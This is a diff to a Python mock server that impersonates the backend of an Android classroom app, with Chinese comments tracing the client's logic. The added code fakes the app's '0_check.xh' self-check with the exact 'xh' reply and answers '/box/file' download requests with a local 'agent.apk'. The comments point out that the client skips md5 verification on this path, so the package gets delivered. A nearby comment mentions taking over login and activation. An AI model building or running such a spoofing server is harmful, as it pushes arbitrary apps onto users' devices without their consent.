@@ -1113,6 +1113,28 @@ def build_response(path, body=b"", host="", method="GET"):
         except Exception as _e3:
             wlog("[SENTRY-DUMP-ERR] %s" % _e3)
     _ep = path.split("?")[0]
+    # ======================================================================
+    # BOX-CHECK: 盒子服务自检应答 —— box -> preDownload 链的唯一外部条件。
+    #   BoxManager.createCheckBoxChain(): new RealCheckBoxInterceptor(0)  (classId 硬编码 0)
+    #   BaseService.syncCheckStatus(0) -> FileService.checkStatus(ServiceUrl, cb)
+    #   FileService.checkStatus(): GET http://<addr>/0_check.xh -> /sdcard/0_check.xh
+    #   FileService$1.success(): 正文 String.equals("xh") 才 setEnable(true)
+    #   正文必须恰好 2 字节 "xh"（无换行/BOM/JSON 包装）。
+    if _ep.lower().endswith("_check.xh"):
+        wlog("!!!!!! [BOX-CHECK] %s%s | Host=%s -> 200 'xh' (2B)" % (host, _ep[:60], host))
+        return _resp(b"xh", "text/plain; charset=UTF-8")
+    # BOX-FILE: 盒子文件服务下载端点。
+    #   FileService.download(DownRequest, cb): 盒子可用时 GET <box>/box/file?url=<base64>&md5=&type=&tag=
+    #   盒子不可用且 DownRequest 带 flag=1 时直接 failed(ONLY_BOX) —— BoxDownload 恰好置 flag=1。
+    #   XHDownloadOkHttpProxy 只校验落盘与回调, 该路径不核对 md5, 因此直接回载荷即可。
+    if _ep.lower().endswith("/box/file"):
+        try:
+            _apkb = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent.apk"), "rb").read()
+            stat["box_file"] = stat.get("box_file", 0) + 1
+            wlog("!!!!!! [BOX-FILE] %s%s -> agent.apk (%dB)" % (host, _ep[:70], len(_apkb)))
+            return _resp(_apkb, "application/vnd.android.package-archive")
+        except Exception as _be:
+            wlog("[BOX-FILE-ERR] %s" % _be)
     # ===== LOGIN/ACTIVATION/ASSIST 接管 (2026-11-01) =====
     import hashlib as _hl2
     _lp2 = path.split("?")[0].lower()
@@ -1852,7 +1874,7 @@ def build_response(path, body=b"", host="", method="GET"):
             "downloadWaitTime": 3, "startLimitRate": 0.015,
         }, ensure_ascii=False)
         _env = {"cmd": 0, "ct": "", "from": "teacher", "gt": 0, "cId": "",
-                "smsg": {"classRoomId": (os.environ.get("CLASS_ID") or "UXHOVJJF"),
+                "smsg": {"classRoomId": (os.environ.get("CLASS_ID") or "CLASSROOM_ID"),
                          "createTag": "default_tag", "data": _ftpdata, "forward": 0,
                          "senderId": 0, "type": 50001,
                          "userIds": (os.environ.get("USER_IDS") or "1000001")}}
